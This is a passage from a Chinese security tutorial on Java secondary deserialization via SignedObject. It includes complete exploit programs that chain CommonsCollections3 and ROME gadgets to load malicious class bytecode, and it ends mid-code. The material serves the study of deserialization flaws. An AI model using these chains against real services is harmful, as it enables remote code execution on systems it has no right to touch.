@@ -1,0 +1,1020 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="1670d2cfd5fb1776fb3af24ab42cc6c6">Java安全 - 浅谈二次反序列化</h1>
+<h1 data-content="1" id="06ab0e692f31035963c3ee0649379305">前言</h1>
+<p>在打反序列化的时候会经常存在JNDI不出网的情况下，无论是ROME链的恶意类加载还是Hessian的拼接起来的链子，都会遇到不出网的情况，那么不出网的情况下，应该怎么打呢？</p>
+<h1 data-content="1" id="a3ef0a7b560015c7297a3cfa0b006318">SignedObject二次反序列化</h1>
+<h3 data-content="1" id="19cba70622029d165a0294c938150c8c">简介</h3>
+<p>它是<code>java.security</code>​下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>​包含另一个<code>Serializable</code>​对象。</p>
+<h3 data-content="1" id="db64827a14a0b82335122e2fbb989ca0">利用链分析</h3>
+<p>利用链</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">SignedObject#getObject() -&gt; x.readObject()</span>
+</pre></div>
+<p>发现getObject()方法中还进行了一次readObject()反序列化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195459-087c7e84-d567-1.png"/></p>
+<p>反序列化的内容也是可控，去看下他的构造方法，将传入的对象进行序列化给b 并将字节数组存储到content中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195509-0ead0256-d567-1.png"/></p>
+<p>一个小型demo来传入恶意对象</p>
+<div class="highlight"><pre><span></span><span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+<span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+<span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+<span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">恶意对象</span> <span class="n">用于第二次反序列化</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+</pre></div>
+<p>那么现在我先手动调用他的getObject()方法并且传入一个可以进行反序列化的对象(随便拉了个CC3就行)</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">SignedObject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InstantiateTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">main</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchAlgorithmException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">SignatureException</span><span class="o">,</span> <span class="n">InvalidKeyException</span><span class="o">,</span> <span class="n">NoSuchFieldException</span> <span class="o">{</span>
+
+        <span class="c1">//CC3</span>
+
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span>  <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+        <span class="n">Field</span> <span class="n">bytecodesField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"</span><span class="o">));</span>
+        <span class="c1">//E:\Java_project\Serialization_Learing\target\classes\Calc.class</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="n">codes</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
+
+        <span class="n">InstantiateTransformer</span> <span class="n">instantiateTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">});</span>
+
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="n">instantiateTransformer</span>
+        <span class="o">};</span>
+
+        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span>  <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+        <span class="n">Constructor</span> <span class="n">cls</span>  <span class="o">=</span>  <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">cls</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">cls</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">lazyMap</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">maproxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">maproxy</span><span class="o">);</span>
+
+
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">((</span><span class="n">Serializable</span><span class="o">)</span> <span class="n">o</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+        <span class="n">signedObject</span><span class="o">.</span><span class="na">getObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195531-1b9fb9ea-d567-1.png"/></p>
+<p>那么既然做到了手动触发，那现在的任务就是进行getter方法的调用，那其实思路也很清晰，找能够调用getter方法的链,刚好也总结一下常见调用getter的方法有哪些吧</p>
+<h3 data-content="1" id="0b06c65041c9b1c8d503f7dbebbf775d">getter触发链分析</h3>
+<h4 data-content="1" id="024a8d73f7f0d20d0799744384c404a8">Rome(HashCode)</h4>
+<p>利用链</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">hashmap#readObject() -&gt; ObjectBean#hashcode() -&gt; EqualsBean#javabeanHashCode() -&gt; ToStringBean#toString()-&gt;SignedObject#getObject()</span>
+</pre></div>
+<p>EXP</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">SignedObject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.EqualsBean</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ObjectBean</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Sign_RomeToStringBean</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span><span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span><span class="n">Object</span> <span class="n">value</span><span class="o">)</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span><span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payloads</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"</span><span class="o">));</span>
+
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">payloads</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"a"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">HashMap</span> <span class="n">hashMap1</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">hashMap1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+
+        <span class="n">HashMap</span> <span class="n">hashMap2</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">SignedObject</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">signedObject</span><span class="o">);</span>
+
+        <span class="c1">//序列化</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap2</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="c1">//反序列化</span>
+        <span class="n">ByteArrayInputStream</span> <span class="n">bais</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">bais</span><span class="o">);</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">HashMap</span> <span class="nf">getpayload</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ObjectBean</span> <span class="n">objectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">ObjectBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">"rand"</span><span class="o">));</span>
+        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"rand"</span><span class="o">);</span>
+        <span class="n">ObjectBean</span> <span class="n">expObjectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"_equalsBean"</span><span class="o">,</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">ObjectBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">expObjectBean</span><span class="o">));</span>
+        <span class="k">return</span> <span class="n">hashMap</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>调用栈为</p>
+<div class="highlight"><pre><span></span><span class="nl">getObject:</span><span class="mi">180</span><span class="o">,</span> <span class="n">SignedObject</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">)</span>
+<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">toString:</span><span class="mi">137</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
+<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
+<span class="nl">toString:</span><span class="mi">120</span><span class="o">,</span> <span class="n">ObjectBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
+<span class="nl">beanHashCode:</span><span class="mi">193</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
+<span class="nl">hashCode:</span><span class="mi">110</span><span class="o">,</span> <span class="n">ObjectBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
+<span class="nl">hash:</span><span class="mi">339</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">readObject:</span><span class="mi">1413</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+</pre></div>
+<h4 data-content="1" id="d3086cf26739f58b65adb89872259455">Rome(Equals)</h4>
+<p>利用链</p>
+<div class="highlight"><pre><span></span>Hashtable#readObject() -&gt; EqualsBean#equals() -&gt; EqualsBean.beanEquals() -&gt; SignedObject#getObject()
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195613-34c7ad7e-d567-1.png"/></p>
+<p>EXP</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">SignedObject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.EqualsBean</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Sign_RomeEqualsBean</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span><span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span><span class="n">Object</span> <span class="n">value</span><span class="o">)</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span><span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payloads</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"</span><span class="o">));</span>
+
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">payloads</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"a"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">Hashtable</span> <span class="n">table1</span> <span class="o">=</span> <span class="n">getPayload</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">table1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+
+        <span class="n">Hashtable</span> <span class="n">table2</span> <span class="o">=</span> <span class="n">getPayload</span><span class="o">(</span><span class="n">SignedObject</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">signedObject</span><span class="o">);</span>
+
+        <span class="c1">//序列化</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
